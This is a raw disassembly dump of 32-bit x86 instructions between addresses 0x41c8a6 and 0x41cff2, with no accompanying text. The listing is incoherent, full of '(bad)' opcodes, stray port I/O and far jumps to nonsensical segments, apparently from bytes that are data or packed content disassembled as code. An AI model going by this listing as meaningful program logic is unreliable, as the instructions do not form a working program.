  41c8a6:	or     BYTE PTR [edx],ch
  41c8a8:	adc    ebx,esp
  41c8aa:	sahf   
  41c8ab:	aad    0xff
  41c8ad:	int3   
  41c8ae:	mov    ds:0xc3cb1433,eax
  41c8b3:	or     eax,0xdb11fb18
  41c8b8:	aam    0xd3
  41c8ba:	shr    DWORD PTR [edx-0x41],cl
  41c8bd:	mov    DWORD PTR [edx],edi
  41c8bf:	mov    DWORD PTR [ecx+0x1],ecx
  41c8c2:	dec    ebp
  41c8c3:	xor    eax,0x4bb5e458
  41c8c8:	cwde   
  41c8c9:	mov    edi,0x78695f73
  41c8ce:	test   eax,0xcb8dbc40
  41c8d3:	mov    eax,0x321d3bf8
  41c8d8:	lea    ebp,[esi-0x38c032b3]
  41c8de:	push   ss
  41c8df:	cdq    
  41c8e0:	jbe    0x41c8bf
  41c8e2:	aam    0xbd
  41c8e4:	mov    bl,0xea
  41c8e6:	jmp    0x2511:0x2603c6a6
  41c8ed:	add    al,0x71
  41c8ef:	mov    ebx,0xb5c16b41
  41c8f4:	pop    edx
  41c8f5:	inc    ebp
  41c8f6:	stos   DWORD PTR es:[edi],eax
  41c8f7:	arpl   WORD PTR [ebp+0xc76619e],sp
  41c8fd:	lods   al,BYTE PTR ds:[esi]
  41c8fe:	fsub   st,st(2)
  41c900:	popa   
  41c901:	pop    ebp
  41c902:	fld    QWORD PTR [ebp+0x76]
  41c905:	jae    0x41c8bb
  41c907:	pop    ebx
  41c908:	cmp    eax,0x23cfee56
  41c90d:	lock inc ebx
  41c90f:	fs (bad) 
  41c911:	cdq    
  41c912:	retf   0x4a37
  41c915:	add    al,0x18
  41c917:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c918:	pop    esi
  41c919:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c91a:	retf   0xb98e
  41c91d:	mov    dl,0x24
  41c91f:	sub    al,0x7f
  41c921:	cmp    al,0xb9
  41c923:	loopne 0x41c955
  41c925:	jp     0x41c8d6
  41c927:	dec    ebp
  41c928:	out    0x3b,al
  41c92a:	cmp    eax,0x2bb7eac4
  41c92f:	xchg   ebx,eax
  41c930:	pusha  
  41c931:	inc    esi
  41c932:	adc    eax,0xa8acc24a
  41c937:	adc    al,0x85
  41c939:	cld    
  41c93a:	or     DWORD PTR [esi+0x610fe61d],ebx
  41c940:	and    DWORD PTR [ebp*1-0x5eacc8c0],edi
  41c947:	rcl    DWORD PTR [edx],1
  41c949:	xchg   ecx,eax
  41c94a:	mov    cl,0x2c
  41c94c:	js     0x41c927
  41c94e:	test   al,0xc6
  41c950:	cmc    
  41c951:	js     0x41c960
  41c953:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c954:	popa   
  41c955:	ds push ss
  41c957:	icebp  
  41c958:	unpckhps xmm3,xmm7
  41c95b:	scas   al,BYTE PTR es:[edi]
  41c95c:	xor    al,0xb0
  41c95e:	push   ds
  41c95f:	push   ebp
  41c960:	mov    al,ds:0x4d82d51e
  41c965:	push   0xffffff83
  41c967:	fs in  al,dx
  41c969:	jle    0x41c996
  41c96b:	in     eax,0x44
  41c96d:	adc    ah,BYTE PTR [ebx-0x26ad07fe]
  41c973:	dec    edi
  41c974:	adc    BYTE PTR [ecx-0x51badf6e],0xab
  41c97b:	repz (bad) 
  41c97d:	push   edx
  41c97e:	cmp    eax,0xc9457286
  41c983:	or     al,0x8
  41c985:	inc    esp
  41c986:	jg     0x41ca06
  41c988:	stos   DWORD PTR es:[edi],eax
  41c989:	push   esi
  41c98a:	inc    edi
  41c98c:	and    BYTE PTR [ebx+0x1d0bd471],cl
  41c992:	and    DWORD PTR [edi+0x54],ebx
  41c995:	mov    cl,0xf3
  41c997:	mov    cl,0xf5
  41c999:	inc    ebx
  41c99a:	inc    ebx
  41c99b:	aas    
  41c99c:	push   es
  41c99d:	push   ebx
  41c99e:	mov    WORD PTR [edx],?
  41c9a0:	je     0x41c9c8
  41c9a2:	xor    BYTE PTR [ecx],dh
  41c9a4:	jecxz  0x41c976
  41c9a6:	out    dx,eax
  41c9a7:	adc    al,0xfd
  41c9a9:	ins    DWORD PTR es:[edi],dx
  41c9aa:	ds sub eax,0x7e84b344
  41c9b0:	push   esi
  41c9b1:	loope  0x41c9dc
  41c9b3:	bound  edi,QWORD PTR [ebp-0x7b5db060]
  41c9b9:	dec    ebx
  41c9ba:	and    DWORD PTR [ebx+0x8],0x9
  41c9be:	pop    ecx
  41c9bf:	adc    al,BYTE PTR [ecx-0x3ce53b2]
  41c9c5:	jae    0x41c9f8
  41c9c7:	adc    eax,0xe6e5217b
  41c9cc:	mov    ebx,0xaa080f23
  41c9d1:	cld    
  41c9d2:	push   ebx
  41c9d3:	mul    al
  41c9d5:	out    0x7d,eax
  41c9d7:	sbb    al,0x44
  41c9d9:	sbb    DWORD PTR [edi],ebx
  41c9db:	retf   
  41c9dc:	jge    0x41ca0e
  41c9de:	jecxz  0x41c9ca
  41c9e0:	mov    BYTE PTR [edx],ch
  41c9e2:	mov    ebx,0x48aeffad
  41c9e7:	add    ebx,ebx
  41c9e9:	xor    BYTE PTR [ecx+eiz*4],0xe0
  41c9ed:	iret   
  41c9ee:	push   ds
  41c9ef:	ds jnp 0x41c991
  41c9f2:	pop    ss
  41c9f3:	sub    dh,BYTE PTR [eax-0x43a198c8]
  41c9f9:	add    cl,BYTE PTR [eax+0x1774b2f]
  41c9ff:	jns    0x41ca65
  41ca01:	test   eax,0xd0848e7d
  41ca06:	mov    WORD PTR [edx],?
  41ca08:	repnz sbb eax,0xaafc822a
  41ca0e:	push   eax
  41ca0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca10:	and    bl,dh
  41ca12:	xchg   DWORD PTR [ecx],edx
  41ca14:	rcl    DWORD PTR [ebp-0x815a1f3],1
  41ca1a:	popf   
  41ca1b:	jle    0x41ca3b
  41ca1d:	push   edi
  41ca1e:	mov    ?,WORD PTR [esi+0x69]
  41ca21:	and    ecx,DWORD PTR [ebx+0x3e]
  41ca24:	dec    ecx
  41ca25:	mov    cl,BYTE PTR [ecx+0x57b9d79b]
  41ca2b:	inc    esp
  41ca2c:	icebp  
  41ca2d:	(bad)  
  41ca2e:	adc    eax,0x1b28bcac
  41ca33:	add    BYTE PTR [ebp+0x0],ah
  41ca36:	mov    DWORD PTR [ecx-0x7f],edi
  41ca39:	ja     0x41ca7f
  41ca3b:	mov    edx,0xf75a52b
  41ca40:	imul   esi,DWORD PTR [ebx+eax*4],0x508010c5
  41ca47:	pinsrw mm1,WORD PTR ss:[edx-0x12],0xb5
  41ca4d:	and    BYTE PTR [edi-0x42c1ae2b],0x53
  41ca54:	cmp    dl,BYTE PTR [ecx+0x4b]
  41ca57:	cmp    DWORD PTR [ecx-0x18],0xd2382c5e
  41ca5e:	add    DWORD PTR [edx+ecx*4+0x3c54e0b9],ecx
  41ca65:	nop
  41ca66:	or     al,0x80
  41ca68:	daa    
  41ca69:	adc    al,0x61
  41ca6b:	leave  
  41ca6c:	loopne 0x41ca8b
  41ca6e:	jnp    0x41ca42
  41ca70:	and    DWORD PTR [esi],esp
  41ca72:	mov    ch,0xe6
  41ca74:	or     edx,eax
  41ca76:	call   0x1f5029da
  41ca7b:	xchg   DWORD PTR [ebx-0x47153b83],ebx
  41ca81:	push   eax
  41ca82:	pop    es
  41ca83:	pop    eax
  41ca84:	test   al,0xdd
  41ca86:	jbe    0x41cad4
  41ca88:	daa    
  41ca89:	lock shr BYTE PTR [esi+0x39],cl
  41ca8d:	outs   dx,BYTE PTR ds:[esi]
  41ca8e:	int3   
  41ca8f:	or     BYTE PTR [ecx+0xb],0x90
  41ca93:	test   cl,dl
  41ca95:	dec    ebx
  41ca96:	test   al,0xbc
  41ca98:	es inc edx
  41ca9a:	mov    bh,0xc2
  41ca9c:	test   ah,ch
  41ca9e:	dec    edi
  41ca9f:	inc    ecx
  41caa0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41caa1:	or     ch,BYTE PTR [ebx]
  41caa3:	or     dh,BYTE PTR [ebx]
  41caa5:	xor    DWORD PTR [eax],0x4c
  41caa8:	adc    al,0xa5
  41caaa:	xchg   BYTE PTR [ecx-0xc],dl
  41caad:	dec    ecx
  41caae:	imul   ebp,DWORD PTR [edi],0x38
  41cab1:	mov    edx,0xcc37239e
  41cab6:	pushf  
  41cab7:	scas   eax,DWORD PTR es:[edi]
  41cab8:	adc    bh,BYTE PTR [ebp+0x4ac5456b]
  41cabe:	iret   
  41cabf:	mov    ecx,edi
  41cac1:	ficom  WORD PTR [esi+0xd685ebd]
  41cac7:	(bad)  
  41cac8:	popf   
  41cac9:	ret    0x7603
  41cacc:	add    al,0xf3
  41cace:	inc    edx
  41cacf:	mov    ecx,0xfbdf84f8
  41cad4:	pop    es
  41cad5:	aas    
  41cad6:	pop    edx
  41cad7:	mov    esp,0x855e175e
  41cadc:	jecxz  0x41cb08
  41cade:	shl    BYTE PTR [ebp-0x37e4e272],0x96
  41cae5:	mov    ds:0x3ff841b0,eax
  41caea:	pop    eax
  41caeb:	pop    edi
  41caec:	in     eax,0x25
  41caee:	out    dx,al
  41caef:	sahf   
  41caf0:	stos   BYTE PTR es:[edi],al
  41caf1:	add    al,0xca
  41caf3:	jle    0x41cae3
  41caf5:	pop    ds
  41caf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41caf7:	arpl   bp,dx
  41caf9:	(bad)  
  41cafa:	aam    0x42
  41cafc:	call   0xc9c1a4d0
  41cb01:	sub    bl,BYTE PTR ss:[esi]
  41cb04:	bound  ecx,QWORD PTR [eax-0x107855d4]
  41cb0a:	clc    
  41cb0b:	and    edi,DWORD PTR [esi+0x37]
  41cb0e:	shr    DWORD PTR [edx+0x4c],1
  41cb11:	scas   eax,DWORD PTR es:[edi]
  41cb12:	mov    eax,0xe40abe56
  41cb17:	adc    ch,BYTE PTR [eax+0xd]
  41cb1a:	mov    ch,0xdf
  41cb1c:	xchg   edx,eax
  41cb1d:	fidiv  WORD PTR [esi+0x4fb373c4]
  41cb23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb24:	jae    0x41cba4
  41cb26:	inc    esp
  41cb27:	push   ebx
  41cb28:	xchg   ecx,eax
  41cb29:	popf   
  41cb2a:	test   eax,0x7e663b51
  41cb2f:	or     DWORD PTR [edi],esi
  41cb31:	xchg   edi,eax
  41cb32:	mov    WORD PTR [ebp-0x89ca375],gs
  41cb38:	mov    bh,0xa1
  41cb3a:	(bad)  
  41cb3c:	outs   dx,BYTE PTR ds:[esi]
  41cb3d:	add    al,0xf1
  41cb3f:	cld    
  41cb40:	sahf   
  41cb41:	iret   
  41cb42:	and    dl,BYTE PTR [ebp+0x51de9733]
  41cb48:	shl    esi,0x92
  41cb4b:	int3   
  41cb4c:	outs   dx,BYTE PTR ds:[esi]
  41cb4d:	adc    DWORD PTR [esp+ebx*2+0x12],esp
  41cb51:	arpl   WORD PTR [edx],dx
  41cb53:	mov    ds:0x4f58af6f,eax
  41cb58:	pop    esp
  41cb59:	mov    WORD PTR [edx-0x72c74fca],?
  41cb5f:	dec    edx
  41cb60:	jge    0x41cb19
  41cb62:	xchg   edx,eax
  41cb63:	lea    edi,[edi+edi*2]
  41cb66:	and    eax,0x404f8980
  41cb6b:	add    BYTE PTR [edx],cl
  41cb6d:	dec    esp
  41cb6e:	inc    eax
  41cb6f:	mov    bh,0xb7
  41cb71:	adc    ecx,esp
  41cb73:	sub    DWORD PTR [ebx+0x75],0xffffff84
  41cb77:	or     cl,BYTE PTR [eax-0x66]
  41cb7a:	dec    BYTE PTR [ecx+0x7e]
  41cb7d:	mov    al,0xa9
  41cb7f:	stc    
  41cb80:	mov    al,0xf2
  41cb82:	mov    ecx,0x28ee988b
  41cb87:	xor    DWORD PTR [esi-0x68],ecx
  41cb8a:	and    al,0xef
  41cb8c:	mov    al,0x6d
  41cb8e:	ss inc edi
  41cb90:	inc    eax
  41cb91:	je     0x41cc0d
  41cb93:	cmp    bh,cl
  41cb95:	mov    gs,WORD PTR [ecx-0x15da8fda]
  41cb9b:	je     0x41cbc8
  41cb9d:	xor    DWORD PTR [eax],edx
  41cb9f:	(bad)  
  41cba0:	hlt    
  41cba1:	xchg   edx,eax
  41cba2:	test   eax,esp
  41cba4:	mov    al,ds:0x3b849db4
  41cba9:	mov    edi,0xe0ad94d1
  41cbae:	and    eax,0xa7e64d27
  41cbb3:	repz test BYTE PTR [edx+0x5],0xcf
  41cbb8:	aad    0x8b
  41cbba:	xlat   BYTE PTR ds:[ebx]
  41cbbb:	or     DWORD PTR [ecx+0x4b],ebp
  41cbbe:	ins    DWORD PTR es:[edi],dx
  41cbbf:	push   esi
  41cbc0:	stos   DWORD PTR es:[edi],eax
  41cbc1:	not    BYTE PTR ds:0x7e9b0eeb
  41cbc7:	dec    esp
  41cbc8:	popa   
  41cbc9:	inc    edi
  41cbca:	mov    WORD PTR [esp+edx*1],cs
  41cbcd:	jb     0x41cbe7
  41cbcf:	fs jecxz 0x41cbd4
  41cbd2:	sub    BYTE PTR [edx-0x6f],ch
  41cbd5:	pop    eax
  41cbd7:	cmp    BYTE PTR [edi+0x37],0x48
  41cbdb:	cmp    DWORD PTR [ebx-0x45],0xb5c55d3a
  41cbe2:	lahf   
  41cbe3:	xchg   ecx,eax
  41cbe4:	pop    edx
  41cbe5:	in     eax,0xc3
  41cbe7:	or     esi,eax
  41cbe9:	push   esi
  41cbea:	jo     0x41cc5d
  41cbec:	dec    ecx
  41cbed:	add    DWORD PTR [ecx-0x6f],esi
  41cbf0:	sub    dl,BYTE PTR [ecx+0x7e6d88a9]
  41cbf6:	or     ah,BYTE PTR [ebx]
  41cbf8:	jbe    0x41cc73
  41cbfa:	cld    
  41cbfb:	jbe    0x41cc14
  41cbfd:	add    BYTE PTR [eax-0x147ee576],0x3a
  41cc04:	xchg   esi,eax
  41cc05:	les    edi,FWORD PTR [esi+0x6c0af8a4]
  41cc0b:	jle    0x41cc21
  41cc0d:	sti    
  41cc0e:	xor    eax,0x82532777
  41cc13:	add    bh,BYTE PTR [ebp+0x3]
  41cc16:	add    ecx,0x1499e49f
  41cc1c:	dec    eax
  41cc1d:	xor    BYTE PTR [edx-0x63],al
  41cc20:	adc    DWORD PTR [esi+0x4c1caf2e],ecx
  41cc26:	sub    DWORD PTR [esi+0x47bab356],eax
  41cc2c:	outs   dx,BYTE PTR ds:[esi]
  41cc2d:	mov    edx,0x9bc6fd81
  41cc32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc33:	inc    ebp
  41cc34:	jo     0x41cc1e
  41cc36:	test   DWORD PTR [ebp-0x1c],0x49c8982f
  41cc3d:	mov    ds:0x9390a855,eax
  41cc42:	jne    0x41cc2f
  41cc44:	or     BYTE PTR [edi-0x56c6142c],dh
  41cc4a:	fdiv   st(6),st
  41cc4c:	imul   ebp,ebx,0xffffffc9
  41cc4f:	inc    ebp
  41cc50:	cmp    al,0xe6
  41cc52:	in     eax,0xbd
  41cc54:	ficom  DWORD PTR [edx+0x6d0703b1]
  41cc5a:	fcom   DWORD PTR [ebx+esi*2+0x2a]
  41cc5e:	add    bl,dh
  41cc60:	jl     0x41cbf6
  41cc62:	nop
  41cc63:	mov    BYTE PTR ds:0x183354bf,ah
  41cc69:	mov    eax,ds:0xe4d58371
  41cc6e:	add    DWORD PTR [edx-0x8],esi
  41cc71:	cld    
  41cc72:	adc    eax,0xaad9d64
  41cc77:	dec    ebp
  41cc78:	inc    eax
  41cc79:	sub    BYTE PTR [esi+0x2601c567],dl
  41cc7f:	mov    ds:0xcfc193ce,al
  41cc84:	stos   DWORD PTR es:[edi],eax
  41cc85:	or     DWORD PTR [ebp+0x6ae912a1],esi
  41cc8b:	add    edx,edi
  41cc8d:	push   ebp
  41cc8e:	sub    esp,DWORD PTR [edi]
  41cc90:	leave  
  41cc91:	pusha  
  41cc92:	and    DWORD PTR [edx],ebx
  41cc94:	in     al,0x7e
  41cc96:	dec    ebx
  41cc97:	xchg   esi,eax
  41cc98:	jmp    0x41ccaf
  41cc9a:	add    dl,ch
  41cc9c:	add    DWORD PTR [edi-0x74b115a3],ebx
  41cca2:	les    edi,FWORD PTR [ebx+0x5159bc9f]
  41cca8:	jmp    0x8b5a:0xfa0d74af
  41ccaf:	es and bl,al
  41ccb2:	push   cs
  41ccb3:	xor    BYTE PTR [esi+0x7c],ch
  41ccb6:	dec    edx
  41ccb7:	push   0xffffff8c
  41ccb9:	xor    bl,BYTE PTR [eax+ebp*2-0x6b]
  41ccbd:	lea    edi,[eax]
  41ccbf:	cmp    DWORD PTR [ebx+edx*8],0xd843c03d
  41ccc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ccc7:	jne    0x41ccf1
  41ccc9:	jmp    0x41cc90
  41cccb:	in     al,dx
  41cccc:	push   edi
  41cccd:	imul   esi,DWORD PTR [edi],0xffffffd0
  41ccd0:	pop    eax
  41ccd1:	or     DWORD PTR [edi-0x38],ebx
  41ccd4:	fwait
  41ccd5:	lds    ebp,FWORD PTR [ecx+0x45]
  41ccd8:	popf   
  41ccd9:	mov    eax,ds:0xb7de0d6d
  41ccde:	jle    0x41ccf7
  41cce0:	adc    eax,0x654857bc
  41cce5:	push   0xadfa3f55
  41ccea:	ret    
  41cceb:	out    0x89,al
  41cced:	jmp    0x4e29:0xb3a4d104
  41ccf4:	(bad)  
  41ccf5:	pushf  
  41ccf6:	loope  0x41ccda
  41ccf8:	adc    eax,DWORD PTR [eax-0x7eb32de]
  41ccfe:	shl    BYTE PTR [ebp+0x5b],1
  41cd01:	fnsave [ebx+0x7]
  41cd04:	lods   eax,DWORD PTR ds:[esi]
  41cd05:	int3   
  41cd06:	xor    eax,0xdfe80970
  41cd0b:	div    DWORD PTR ds:0x4d227e65
  41cd11:	push   0xffffff80
  41cd13:	cmp    dl,BYTE PTR [ecx+ebp*1]
  41cd16:	mov    ds:0xdb3641c5,eax
  41cd1b:	jp     0x41ccb2
  41cd1d:	fidivr WORD PTR [ebx-0x74c86f6e]
  41cd23:	xchg   ebp,eax
  41cd24:	mov    eax,ds:0x6555d9fd
  41cd29:	push   0x7f
  41cd2b:	add    ch,cl
  41cd2d:	mov    ds:0x93781f85,al
  41cd32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd33:	in     eax,0x99
  41cd35:	xchg   ah,ah
  41cd37:	aas    
  41cd38:	sub    cl,cl
  41cd3a:	mov    ebx,0xad4999e6
  41cd3f:	ins    BYTE PTR es:[edi],dx
  41cd40:	(bad)  
  41cd41:	or     al,0xbc
  41cd43:	(bad)  
  41cd45:	xor    eax,0xe1f44d1
  41cd4a:	cdq    
  41cd4b:	xor    BYTE PTR [ecx-0x716667d7],bl
  41cd51:	xchg   DWORD PTR [eax],ebp
  41cd53:	call   0x93eb01cd
  41cd58:	loope  0x41cce9
  41cd5a:	sub    BYTE PTR [eax],ah
  41cd5c:	sbb    al,0x57
  41cd5e:	or     al,0x18
  41cd60:	mov    ecx,0x1f14734e
  41cd65:	sub    eax,ebx
  41cd67:	xchg   DWORD PTR [edi],ecx
  41cd69:	mov    eax,ds:0xa3ee6365
  41cd6e:	dec    edx
  41cd6f:	mov    ds:0x947e9dc6,eax
  41cd74:	sub    BYTE PTR [edi],al
  41cd76:	push   ds
  41cd77:	pop    es
  41cd78:	xor    dh,BYTE PTR [ebx+0x5973bb7d]
  41cd7e:	fsubr  DWORD PTR [eax+0x3c6cb225]
  41cd84:	sti    
  41cd85:	test   al,0xf
  41cd87:	(bad)  
  41cd88:	lahf   
  41cd89:	test   DWORD PTR [ebp+0x2f],edi
  41cd8c:	jmp    0x5e22a017
  41cd91:	adc    al,0xf9
  41cd93:	imul   edx,DWORD PTR cs:[eax+0x60babc4],0xd6f9123c
  41cd9e:	inc    ecx
  41cd9f:	cld    
  41cda0:	xor    BYTE PTR [eax],0xea
  41cda3:	cmp    BYTE PTR [ebx-0x29],0xa3
  41cda7:	outs   dx,DWORD PTR ds:[esi]
  41cda8:	test   BYTE PTR [ebx-0x300eb650],dl
  41cdae:	enter  0x3ab4,0x5a
  41cdb2:	mov    bh,0xff
  41cdb4:	push   eax
  41cdb5:	outs   dx,BYTE PTR gs:[esi]
  41cdb7:	mov    eax,0x38d7e189
  41cdbc:	dec    edi
  41cdbd:	ja     0x41ce33
  41cdbf:	dec    edi
  41cdc0:	adc    dl,bl
  41cdc2:	fimul  WORD PTR [edi]
  41cdc4:	iret   
  41cdc5:	pop    esp
  41cdc6:	push   ebx
  41cdc7:	dec    ebp
  41cdc8:	retf   
  41cdc9:	cmp    al,0x70
  41cdcb:	adc    eax,0x3ce2e3fb
  41cdd0:	dec    esp
  41cdd1:	out    dx,eax
  41cdd2:	pushf  
  41cdd3:	sub    DWORD PTR [ebx+0xd],0xffffffe4
  41cdd7:	ret    
  41cdd8:	inc    ebx
  41cdd9:	sub    ecx,esp
  41cddb:	dec    esp
  41cddc:	and    DWORD PTR [esp+esi*4],ebx
  41cddf:	retf   
  41cde0:	jbe    0x41ce08
  41cde2:	xor    BYTE PTR [ebx],0x92
  41cde5:	jne    0x41cde7
  41cde7:	sbb    DWORD PTR [ebp+0x17a9d0d3],edx
  41cded:	xchg   esp,eax
  41cdee:	jmp    0x41ce24
  41cdf0:	mov    esi,0x1d9f532c
  41cdf5:	inc    eax
  41cdf6:	pmaxub mm2,QWORD PTR [edi]
  41cdf9:	inc    esp
  41cdfa:	jbe    0x41cdcc
  41cdfc:	or     bl,BYTE PTR [ecx-0x3519cf26]
  41ce02:	mov    cl,0x85
  41ce04:	das    
  41ce05:	fild   QWORD PTR [ebx+0x4d]
  41ce08:	dec    esi
  41ce09:	stc    
  41ce0a:	push   ebp
  41ce0b:	and    BYTE PTR [ebx-0x2422344e],al
  41ce11:	adc    ebp,DWORD PTR [esi-0xaafa60e]
  41ce17:	mov    WORD PTR [ecx-0x610218d0],ds
  41ce1d:	push   0x339f6f9e
  41ce22:	fcomip st,st(4)
  41ce24:	mov    dl,0x6a
  41ce26:	inc    ecx
  41ce27:	pop    es
  41ce28:	into   
  41ce29:	cld    
  41ce2a:	imul   edi,DWORD PTR [edx+0xa9609de],0x11
  41ce31:	mov    cl,0x95
  41ce33:	add    al,0x6d
  41ce35:	(bad)  
  41ce36:	push   es
  41ce37:	jmp    0x41ce9f
  41ce39:	mov    esp,esi
  41ce3b:	lds    esp,FWORD PTR [ebp-0x53]
  41ce3e:	jbe    0x41ce03
  41ce40:	sbb    ebx,0xffffffe8
  41ce43:	mov    ch,0x15
  41ce45:	or     ebp,edx
  41ce47:	arpl   di,cx
  41ce49:	ja     0x41ce12
  41ce4b:	(bad)  
  41ce4c:	mov    ch,0x6b
  41ce4e:	jg     0x41cecf
  41ce50:	xor    al,0x13
  41ce52:	xor    BYTE PTR [ebx-0x4a],bl
  41ce55:	push   0xffffffbf
  41ce57:	xchg   esi,eax
  41ce58:	mov    ebp,0xe5a2bd06
  41ce5d:	xor    eax,0x1a672dd9
  41ce62:	adc    al,0x90
  41ce64:	shr    DWORD PTR [eax+0x2664393d],cl
  41ce6a:	mov    bl,0x88
  41ce6c:	pop    ss
  41ce6d:	pop    es
  41ce6e:	xchg   BYTE PTR [eax+0x5a22d353],ch
  41ce74:	jge    0x41ceb4
  41ce76:	outs   dx,BYTE PTR ds:[esi]
  41ce77:	xor    al,BYTE PTR fs:[ebp-0x2779bf23]
  41ce7e:	in     al,dx
  41ce7f:	dec    ebx
  41ce80:	pop    ebx
  41ce81:	jno    0x41ce64
  41ce83:	pop    eax
  41ce84:	cmp    BYTE PTR [esi+0x39],dl
  41ce87:	aad    0x2e
  41ce89:	sahf   
  41ce8a:	xor    edx,DWORD PTR [edx]
  41ce8c:	add    eax,DWORD PTR ds:0x8c790c7f
  41ce92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce93:	xchg   ecx,eax
  41ce94:	or     ebx,DWORD PTR [ecx]
  41ce96:	jge    0x41ce88
  41ce98:	setl   BYTE PTR [ebx+0xa8882a6]
  41ce9f:	loope  0x41cec2
  41cea1:	je     0x41ce7f
  41cea3:	aas    
  41cea4:	ja     0x41ceb1
  41cea6:	sbb    al,0x58
  41cea8:	and    ebp,DWORD PTR [eax-0x4]
  41ceab:	xor    ch,BYTE PTR [esi-0x15]
  41ceae:	lea    ecx,[eax+0x7a9324d3]
  41ceb4:	je     0x41ced5
  41ceb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ceb7:	and    bl,dl
  41ceb9:	jp     0x41cf26
  41cebb:	nop
  41cebc:	int    0x82
  41cebe:	scas   eax,DWORD PTR es:[edi]
  41cebf:	mov    cl,0x92
  41cec1:	push   esi
  41cec2:	xor    al,0xc5
  41cec4:	or     BYTE PTR [ecx],cl
  41cec6:	test   eax,0xf28042bf
  41cecb:	fst    DWORD PTR [edi-0x4ac69850]
  41ced1:	lods   al,BYTE PTR ds:[esi]
  41ced2:	xchg   edx,eax
  41ced3:	mul    si
  41ced6:	jge    0x41ceb2
  41ced8:	push   esi
  41ced9:	and    ah,BYTE PTR [edx+0x79]
  41cedc:	pop    ebp
  41cedd:	int3   
  41cede:	xor    eax,0x8ffe3e7d
  41cee3:	cdq    
  41cee4:	mov    cl,0x8e
  41cee6:	imul   edi,DWORD PTR [edx+0x15],0xffffffe5
  41ceea:	and    BYTE PTR [ebx+esi*8],0xa3
  41ceee:	arpl   WORD PTR [ebp+0x60],bp
  41cef1:	mov    al,0xf
  41cef3:	in     eax,0xe8
  41cef5:	fisttp QWORD PTR [ecx+0x58]
  41cef8:	sub    dl,BYTE PTR [edi-0x29df9c92]
  41cefe:	mov    ebp,0xfa9050a4
  41cf03:	aad    0xaf
  41cf05:	jg     0x41ce95
  41cf07:	mov    ds:0xfda528b6,eax
  41cf0c:	push   ds
  41cf0d:	add    ebx,DWORD PTR [ebx]
  41cf0f:	pusha  
  41cf10:	enter  0x55ac,0x3a
  41cf14:	aad    0xf2
  41cf16:	dec    eax
  41cf17:	adc    DWORD PTR [ebx],ebx
  41cf19:	cli    
  41cf1a:	jle    0x41cf72
  41cf1c:	pop    es
  41cf1d:	dec    esp
  41cf1e:	add    cl,BYTE PTR [ebx]
  41cf20:	or     ch,dh
  41cf22:	shr    bl,cl
  41cf24:	jecxz  0x41cfa3
  41cf26:	neg    BYTE PTR [edx-0x4d63ba9a]
  41cf2c:	sub    DWORD PTR [ebp-0x2f916c7f],edi
  41cf32:	sahf   
  41cf33:	jnp    0x41ceed
  41cf35:	xchg   DWORD PTR [esi-0x12],ebp
  41cf38:	inc    ebx
  41cf39:	(bad)  
  41cf3a:	cli    
  41cf3b:	jmp    0x41cf56
  41cf3d:	scas   eax,DWORD PTR es:[edi]
  41cf3e:	adc    edx,esp
  41cf40:	sub    ecx,DWORD PTR [eax-0x4fdc1d52]
  41cf46:	jl     0x41cfa9
  41cf48:	sbb    bl,cl
  41cf4a:	fldcw  WORD PTR [ecx+eiz*2]
  41cf4d:	xchg   BYTE PTR [ebx-0x42cbaac7],dl
  41cf53:	or     al,0xed
  41cf55:	lock pop ss
  41cf57:	jecxz  0x41cfaf
  41cf59:	fucom  st(7)
  41cf5b:	arpl   WORD PTR [ecx-0xc],ax
  41cf5e:	mov    ebp,DWORD PTR gs:[eax]
  41cf61:	add    al,0xdb
  41cf63:	popa   
  41cf64:	jecxz  0x41cf75
  41cf66:	rcr    BYTE PTR [esi+edi*4-0x80],0x3
  41cf6b:	sahf   
  41cf6c:	imul   ecx,DWORD PTR [edx+edx*2+0x5cb1fe10],0x4ef1f964
  41cf77:	call   0x255f:0x8b1dbb41
  41cf7e:	mov    ecx,0x3bddb86b
  41cf83:	les    ebx,FWORD PTR [edx-0x75d37d04]
  41cf89:	mov    edi,0xcd3a3c5a
  41cf8e:	xchg   edi,eax
  41cf8f:	cs sbb eax,ebp
  41cf92:	mov    BYTE PTR [ebp-0x1d],ah
  41cf95:	retf   0x46e
  41cf98:	scas   eax,DWORD PTR es:[edi]
  41cf99:	jmp    0x49c4:0x6aaf6ed5
  41cfa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cfa1:	cmp    eax,0xcaa6a2be
  41cfa6:	scas   eax,DWORD PTR es:[edi]
  41cfa7:	pop    esp
  41cfa8:	cmp    al,0x35
  41cfaa:	int3   
  41cfab:	push   esi
  41cfac:	imul   ebp,edx,0xffffffb2
  41cfaf:	call   FWORD PTR [esi+0x2b]
  41cfb2:	in     eax,0xb4
  41cfb4:	clc    
  41cfb5:	sbb    WORD PTR [esp+ebx*8-0x6252bc7d],di
  41cfbd:	leave  
  41cfbe:	inc    esi
  41cfbf:	sub    ebx,ecx
  41cfc1:	jmp    0x41cf77
  41cfc3:	not    cl
  41cfc5:	div    BYTE PTR [ecx]
  41cfc7:	inc    esp
  41cfc8:	mov    esp,0xa1aa69d4
  41cfcd:	or     BYTE PTR [esi],0x2c
  41cfd0:	dec    edx
  41cfd1:	jp     0x41cfec
  41cfd3:	cmp    edx,edx
  41cfd5:	int3   
  41cfd6:	mov    esp,0x366b4d15
  41cfdb:	outs   dx,DWORD PTR ds:[esi]
  41cfdc:	jns    0x41cf8f
  41cfde:	stos   BYTE PTR es:[edi],al
  41cfdf:	jmp    0x154cf026
  41cfe4:	xchg   edx,eax
  41cfe5:	ins    DWORD PTR es:[edi],dx
  41cfe6:	pop    esp
  41cfe7:	scas   al,BYTE PTR es:[edi]
  41cfe8:	add    al,0xf0
  41cfea:	push   eax
  41cfeb:	popa   
  41cfec:	cmp    ebp,DWORD PTR [ebx+0x2d9391ea]
  41cff2:	add    BYTE PTR [esi-0x446fd6f6],ah
